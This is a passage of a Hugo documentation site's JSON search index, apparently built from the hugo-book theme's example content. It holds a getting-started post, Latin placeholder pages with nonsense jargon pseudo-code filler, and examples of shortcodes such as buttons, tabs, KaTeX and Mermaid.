"},{"id":14,"href":"/posts/hugoisforlovers/","title":"Getting Started with Hugo","section":"Blog","content":" Step 1. Install Hugo # Go to Hugo releases and download the appropriate version for your OS and architecture.\nSave it somewhere specific as we will be using it in the next step.\nMore complete instructions are available at Install Hugo\nStep 2. Build the Docs # Hugo has its own example site which happens to also be the documentation site you are reading right now.\nFollow the following steps:\nClone the Hugo repository Go into the repo Run hugo in server mode and build the docs Open your browser to http://localhost:1313 Corresponding pseudo commands:\ngit clone https://github.com/spf13/hugo cd hugo /path/to/where/you/installed/hugo server --source=./docs \u0026gt; 29 pages created \u0026gt; 0 tags index created \u0026gt; in 27 ms \u0026gt; Web Server is available at http://localhost:1313 \u0026gt; Press ctrl+c to stop Once you\u0026rsquo;ve gotten here, follow along the rest of this page on your local build.\nStep 3. Change the docs site # Stop the Hugo process by hitting Ctrl+C.\nNow we are going to run hugo again, but this time with hugo in watch mode.\n/path/to/hugo/from/step/1/hugo server --source=./docs --watch \u0026gt; 29 pages created \u0026gt; 0 tags index created \u0026gt; in 27 ms \u0026gt; Web Server is available at http://localhost:1313 \u0026gt; Watching for changes in /Users/spf13/Code/hugo/docs/content \u0026gt; Press ctrl+c to stop Open your favorite editor and change one of the source content pages. How about changing this very file to fix the typo. How about changing this very file to fix the typo.\nContent files are found in docs/content/. Unless otherwise specified, files are located at the same relative location as the url, in our case docs/content/overview/quickstart.md.\nChange and save this file.. Notice what happened in your terminal.\n\u0026gt; Change detected, rebuilding site \u0026gt; 29 pages created \u0026gt; 0 tags index created \u0026gt; in 26 ms Refresh the browser and observe that the typo is now fixed.\nNotice how quick that was. Try to refresh the site before it\u0026rsquo;s finished building. I double dare you. Having nearly instant feedback enables you to have your creativity flow without waiting for long builds.\nStep 4. Have fun # The best way to learn something is to play with it.\n"},{"id":15,"href":"/docs/example/collapsed/3rd-level/4th-level/","title":"4th Level","section":"3rd Level","content":" 4th Level of Menu # Caesorum illa tu sentit micat vestes papyriferi # Inde aderam facti; Theseus vis de tauri illa peream. Oculos uberaque non regisque vobis cursuque, opus venit quam vulnera. Et maiora necemque, lege modo; gestanda nitidi, vero? Dum ne pectoraque testantur.\nVenasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii. Cupiens auctoribus pariter rubet, profana magni super nocens. Vos ius sibilat inpar turba visae iusto! Sedes ante dum superest extrema.\n"},{"id":16,"href":"/docs/example/collapsed/3rd-level/","title":"3rd Level","section":"Collapsed","content":" 3rd Level of Menu # Nefas discordemque domino montes numen tum humili nexilibusque exit, Iove. Quae miror esse, scelerisque Melaneus viribus. Miseri laurus. Hoc est proposita me ante aliquid, aura inponere candidioribus quidque accendit bella, sumpta. Intravit quam erat figentem hunc, motus de fontes parvo tempestate.\niscsi_virus = pitch(json_in_on(eupViral), northbridge_services_troubleshooting, personal( firmware_rw.trash_rw_crm.device(interactive_gopher_personal, software, -1), megabit, ergonomicsSoftware(cmyk_usb_panel, mips_whitelist_duplex, cpa))); if (5) { managementNetwork += dma - boolean; kilohertz_token = 2; honeypot_affiliate_ergonomics = fiber; } mouseNorthbridge = byte(nybble_xmp_modem.horse_subnet( analogThroughputService * graphicPoint, drop(daw_bit, dnsIntranet), gateway_ospf), repository.domain_key.mouse(serverData(fileNetwork, trim_duplex_file), cellTapeDirect, token_tooltip_mashup( ripcordingMashup))); module_it = honeypot_driver(client_cold_dvr(593902, ripping_frequency) + coreLog.joystick(componentUdpLink), windows_expansion_touchscreen); bashGigabit.external.reality(2, server_hardware_codec.flops.ebookSampling( ciscNavigationBacklink, table + cleanDriver), indexProtocolIsp); "},{"id":17,"href":"/docs/example/hidden/","title":"Hidden","section":"Example Site","content":" This page is hidden in menu # Quondam non pater est dignior ille Eurotas # Latent te facies # Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\nPater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor Cum honorum Latona # O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer), pad.property_data_programming.sectorBrowserPpga(dataMask, 37, recycleRup)); intellectualVaporwareUser += -5 * 4; traceroute_key_upnp /= lag_optical(android.smb(thyristorTftp)); surge_host_golden = mca_compact_device(dual_dpi_opengl, 33, commerce_add_ppc); if (lun_ipv) { verticalExtranet(1, thumbnail_ttl, 3); bar_graphics_jpeg(chipset - sector_xmp_beta); } Fronde cetera dextrae sequens pennis voce muneris # Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software; if (internic \u0026gt; disk) { emoticonLockCron += 37 + bps - 4; wan_ansi_honeypot.cardGigaflops = artificialStorageCgi; simplex -= downloadAccess; } var volumeHardeningAndroid = pixel + tftp + onProcessorUnmount; sector(memory(firewire + interlaced, wired)); "},{"id":18,"href":"/docs/shortcodes/buttons/","title":"Buttons","section":"Shortcodes","content":" Buttons # Buttons are styled links that can lead to local page or external link.\nExample # {{\u0026lt; button relref=\u0026#34;/\u0026#34; [class=\u0026#34;...\u0026#34;] \u0026gt;}}Get Home{{\u0026lt; /button \u0026gt;}} {{\u0026lt; button href=\u0026#34;https://github.com/alex-shpak/hugo-book\u0026#34; \u0026gt;}}Contribute{{\u0026lt; /button \u0026gt;}} Get Home Contribute "},{"id":19,"href":"/docs/shortcodes/columns/","title":"Columns","section":"Shortcodes","content":" Columns # Columns help organize shorter pieces of content horizontally for readability.\n{{\u0026lt; columns \u0026gt;}} \u0026lt;!-- begin columns block --\u0026gt; # Left Content Lorem markdownum insigne... \u0026lt;---\u0026gt; \u0026lt;!-- magic separator, between columns --\u0026gt; # Mid Content Lorem markdownum insigne... \u0026lt;---\u0026gt; \u0026lt;!-- magic separator, between columns --\u0026gt; # Right Content Lorem markdownum insigne... {{\u0026lt; /columns \u0026gt;}} Example # Left Content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia. Mid Content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Right Content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia. "},{"id":20,"href":"/docs/shortcodes/details/","title":"Details","section":"Shortcodes","content":" Details # Details shortcode is a helper for details html5 element. It is going to replace expand shortcode.\nExample # {{\u0026lt; details \u0026#34;Title\u0026#34; [open] \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /details \u0026gt;}} {{\u0026lt; details title=\u0026#34;Title\u0026#34; open=true \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /details \u0026gt;}} Title Markdown content # Lorem markdownum insigne\u0026hellip; "},{"id":21,"href":"/docs/shortcodes/expand/","title":"Expand","section":"Shortcodes","content":" Expand # Expand shortcode can help to decrease clutter on screen by hiding part of text. Expand content by clicking on it.\nExample # Default # {{\u0026lt; expand \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /expand \u0026gt;}} Expand ↕ Markdown content # Lorem markdownum insigne\u0026hellip; With Custom Label # {{\u0026lt; expand \u0026#34;Custom Label\u0026#34; \u0026#34;...\u0026#34; \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /expand \u0026gt;}} Custom Label ... Markdown content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia. "},{"id":22,"href":"/docs/shortcodes/hints/","title":"Hints","section":"Shortcodes","content":" Hints # Hint shortcode can be used as hint/alerts/notification block.\nThere are 3 colors to choose: info, warning and danger.\n{{\u0026lt; hint [info|warning|danger] \u0026gt;}} **Markdown content** Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa {{\u0026lt; /hint \u0026gt;}} Example # Markdown content\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa Markdown content\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa Markdown content\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa "},{"id":23,"href":"/docs/shortcodes/katex/","title":"Katex","section":"Shortcodes","content":" KaTeX # KaTeX shortcode let you render math typesetting in markdown document. See KaTeX\nExample # {{\u0026lt; katex [display] [class=\u0026#34;text-center\u0026#34;] \u0026gt;}} f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi {{\u0026lt; /katex \u0026gt;}} \\[f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi\\] Display Mode Example # Here is some inline example: \\(\\pi(x)\\) , rendered in the same line. And below is display example, having display: block \\[f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi\\] Text continues here.\n"},{"id":24,"href":"/docs/shortcodes/mermaid/","title":"Mermaid","section":"Shortcodes","content":" Mermaid Chart # MermaidJS is library for generating svg charts and diagrams from text.\nOverride Mermaid Initialization Config\nTo override the initialization config for Mermaid, create a mermaid.json file in your assets folder!\nExample # {{\u0026lt; mermaid [class=\u0026#34;text-center\u0026#34;]\u0026gt;}} stateDiagram-v2 State1: The state with a note note right of State1 Important information! You can write notes. end note State1 --\u0026gt; State2 note left of State2 : This is the note to the left. {{\u0026lt; /mermaid \u0026gt;}} stateDiagram-v2 State1: The state with a note note right of State1 Important information! You can write notes. end note State1 --\u003e State2 note left of State2 : This is the note to the left. "},{"id":25,"href":"/docs/shortcodes/section/","title":"Section","section":"Shortcodes","content":" Section # Section renders pages in section as definition list, using title and description.\nExample # {{\u0026lt; section \u0026gt;}} First Page First page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Second Page Second Page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. "},{"id":26,"href":"/docs/shortcodes/section/first-page/","title":"First Page","section":"Section","content":" First page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\nDuis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n"},{"id":27,"href":"/docs/shortcodes/section/second-page/","title":"Second Page","section":"Section","content":" Second Page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\nDuis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n"},{"id":28,"href":"/docs/shortcodes/tabs/","title":"Tabs","section":"Shortcodes","content":" Tabs # Tabs let you organize content by context, for example installation instructions for each supported platform.\n{{\u0026lt; tabs \u0026#34;uniqueid\u0026#34; \u0026gt;}} {{\u0026lt; tab \u0026#34;MacOS\u0026#34; \u0026gt;}} # MacOS Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} # Linux Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} # Windows Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; /tabs \u0026gt;}} Example # MacOS MacOS # This is tab MacOS content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\nLinux Linux # This is tab Linux content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\nWindows Windows # This is tab Windows content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\n"}]